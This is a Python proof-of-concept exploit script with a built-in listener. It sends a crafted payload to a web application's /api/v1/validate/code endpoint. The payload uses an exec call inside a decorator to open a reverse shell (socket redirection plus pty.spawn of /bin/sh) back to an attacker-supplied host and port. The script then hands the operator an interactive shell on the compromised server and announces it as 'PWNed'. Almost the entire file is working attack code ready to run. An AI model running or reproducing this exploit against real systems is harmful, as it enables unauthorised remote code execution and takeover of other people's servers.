import argparse
import socket
import threading
import sys
import requests
import select
import time
import random

def print_green(text):
    print(f"\033[92m{text}\033[0m")

def print_red(text):
    print(f"\033[91m{text}\033[0m")

def print_yellow(text):
    print(f"\033[93m{text}\033[0m")

def funny_terminal_joke():
    jokes = [
        "Why do programmers prefer dark mode? Because light attracts bugs!",
        "There are 10 types of people in the world: those who understand binary and those who don't.",
        "rm -rf /? That's a dangerous command!",
        "Have you tried turning it off and on again?",
        "Segmentation fault? More like 'segment and halt!'",
        "Why do Java developers wear glasses? Because they don't see sharp.",
    ]
    return random.choice(jokes)

def start_listener(listener_ip, listener_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((listener_ip, listener_port))
    except OSError as e:
        if e.errno == 98:  # address already in use error
            print_red(f"[-] Port {listener_port} is already in use. Try another port.")
            sys.exit(1)
        else:
            raise
    server.listen(1)
    print_green(f"[+] Listener started on {listener_ip}:{listener_port}, waiting for connection...")
    try:
        client_socket, addr = server.accept()
        print_green(f"[+] Connection from {addr[0]}:{addr[1]} received!")
        print_green(f"[+] PWNed {addr[0]}:{addr[1]}")
        print_yellow(f"[*] {funny_terminal_joke()}")
        print_yellow("[*] Interactive shell:")

        interact(client_socket)
    except KeyboardInterrupt:
        print_yellow("\n[*] Listener interrupted by user. Exiting.")
    finally:
        server.close()

def interact(client_socket):
    try:
        while True:
            try:
                cmd = input("")  # no prompt, shell shows its own
            except KeyboardInterrupt:
                print_yellow("\n[*] Exiting shell.")
                break
            if cmd == "exit":
                break
            if cmd.strip() == "":
                continue

            client_socket.sendall(cmd.encode() + b"\n")

            output = b""
            while True:
                ready = select.select([client_socket], [], [], 0.3)
                if ready[0]:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    output += data
                else:
                    break

            text = output.decode(errors="ignore")
            lines = text.splitlines()
            if lines and lines[0].strip() == cmd.strip():
                lines = lines[1:]
            print("\n".join(lines))
    finally:
        client_socket.close()

def check_vulnerable_path(ip, port):
    url = f"http://{ip}:{port}/api/v1/validate/code"
    try:
        resp = requests.head(url, timeout=5)
        return resp.status_code == 200
    except requests.RequestException:
        return False

def send_payload(web_ip, web_port, listener_ip, listener_port):
    url = f"http://{web_ip}:{web_port}/api/v1/validate/code"
    headers = {"Content-Type": "application/json"}
    payload_code = (
        f'@exec("import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        f's.connect((\\\"{listener_ip}\\\",{listener_port}));'
        f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/sh\\\")")\n'
        f'def foo():\n pass'
    )
    data = {"code": payload_code}

    print_yellow(f"[+] Sending payload to {url}")
    try:
        requests.post(url, json=data, headers=headers, timeout=5)
    except requests.RequestException:
        pass  # silently ignore errors now

def main():
    parser = argparse.ArgumentParser(description="Exploit POC with listener")
    parser.add_argument("-i", "--ip", required=True, help="Target web server IP")
    parser.add_argument("-p", "--port", required=True, type=int, help="Target web server port")
    parser.add_argument("-l", "--listener", required=True, help="Listener IP")
    parser.add_argument("-lp", "--listener-port", required=True, type=int, help="Listener port")

    args = parser.parse_args()

    if not check_vulnerable_path(args.ip, args.port):
        print_red(f"[-] Vulnerability doesn't exist at http://{args.ip}:{args.port}/api/v1/validate/code")
        sys.exit(1)

    listener_thread = threading.Thread(target=start_listener, args=(args.listener, args.listener_port))
    listener_thread.daemon = True
    listener_thread.start()

    time.sleep(1)  # wait time for listener to start

    send_payload(args.ip, args.port, args.listener, args.listener_port)

    try:
        while listener_thread.is_alive():
            listener_thread.join(1)
    except KeyboardInterrupt:
        print_yellow("\n[*] Exiting script.")
        sys.exit(0)

if __name__ == "__main__":
    main()
